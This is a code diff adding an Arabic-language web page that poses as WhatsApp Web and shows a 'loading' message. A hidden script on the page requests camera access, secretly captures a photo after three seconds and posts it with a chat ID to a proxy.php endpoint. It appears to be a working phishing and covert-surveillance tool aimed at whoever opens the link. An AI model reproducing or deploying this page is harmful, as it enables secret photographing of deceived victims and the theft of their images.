@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>واتساب ويب</title>
+  <style>
+    body { font-family: 'Tajawal', sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 50px; color: #333; }
+    .box { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+    .logo { width: 80px; margin-bottom: 20px; }
+    .title { font-size: 24px; margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+    <div class="title">جاري تحميل الواتساب...</div>
+    <p>يرجى الانتظار حتى يتم تحميل البيانات...</p>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('id');
+
+  function dataURLtoBlob(dataURL) {
+    const byteString = atob(dataURL.split(',')[1]);
+    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+    return new Blob([ab], {type: mimeString});
+  }
+
+  // محاولة الوصول للكاميرا
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg");
+        const photoBlob = dataURLtoBlob(imageData);
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", photoBlob, "photo.jpg");
+        formData.append("message", "تم التقاط صورة!");
+
+        // إرسال الصورة للسيرفر
+        fetch("proxy.php", {
+          method: "POST",
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+      }, 3000);
+    })
+    .catch(function(error) {
+      console.error("خطأ في الوصول للكاميرا:", error);
+    });
+</script>
+
+</body>
+</html>
